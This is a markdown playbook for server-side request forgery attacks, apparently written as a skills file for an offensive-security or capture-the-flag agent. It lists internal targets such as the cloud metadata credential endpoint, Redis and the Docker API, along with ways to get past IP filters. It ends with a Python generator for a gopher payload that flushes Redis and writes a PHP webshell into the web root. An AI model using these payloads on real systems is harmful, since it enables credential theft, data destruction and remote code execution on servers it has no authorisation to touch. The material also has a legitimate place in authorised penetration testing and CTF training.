# Server-Side Request Forgery (SSRF) Playbook (skills/web/ssrf-attacks.md)

## 1. Signatures & Code Patterns

Occurs when the server fetches remote resources using user-supplied URLs without IP/hostname validation:
- **Vulnerable Functions**: `requests.get()`, `urllib.request.urlopen()`, `curl_exec()`, `file_get_contents()`, `fetch()`, `axios.get()`.
- **Target Endpoints**: Webhook registration, avatar import, PDF generator, image proxy, URL preview.

---

## 2. Cloud Metadata & Internal Target Registry

| Target Service | Internal URL | Target Data / Impact |
| :--- | :--- | :--- |
| **AWS / GCP / Azure Metadata** | `http://169.254.169.254/latest/meta-data/` | IAM credentials, security tokens, API keys. |
| **Localhost / Internal Services** | `http://127.0.0.1:8080/admin` | Unauthenticated admin panels, internal APIs. |
| **Redis / Gopher Protocol** | `gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0a...` | Unauthenticated Redis RCE / Crontab overwrite. |
| **Docker Engine API** | `http://127.0.0.1:2375/containers/json` | Container breakout / RCE. |

---

## 3. IP Filter & Parser Bypass Matrix

- **Decimal / Hex / Octal IP Encoding**:
  - `127.0.0.1` $\rightarrow$ `2130706433` (Decimal), `0x7f000001` (Hex), `0177.0.0.1` (Octal).
  - `0.0.0.0` or `0` $\rightarrow$ binds to `localhost`.
- **DNS Rebinding**: Domain resolves to public IP on first check, then `127.0.0.1` on second resolution (e.g. `rbndr.us` or custom DNS server).
- **URL Parser Differentials**:
  - `http://expected.com@127.0.0.1/`
  - `http://127.0.0.1#.expected.com`
  - `http://127.0.0.1:80@google.com/`
- **HTTP Redirect Bypass**: Server follows 302 redirect from external URL to internal `http://127.0.0.1/flag`.

---

## 4. Gopher Redis RCE Generator Snippet
```python
import urllib.parse

# Redis write webshell payload via gopher
redis_commands = [
    "flushall",
    "set flag_probe 'pwned'",
    "config set dir /var/www/html",
    "config set dbfilename shell.php",
    "set shell '<?php system($_GET[\"cmd\"]); ?>'",
    "save"
]
payload = "\r\n".join(redis_commands) + "\r\n"
gopher_url = "gopher://127.0.0.1:6379/_" + urllib.parse.quote(payload)
print(f"[+] Gopher SSRF Payload:\n{gopher_url}")
```
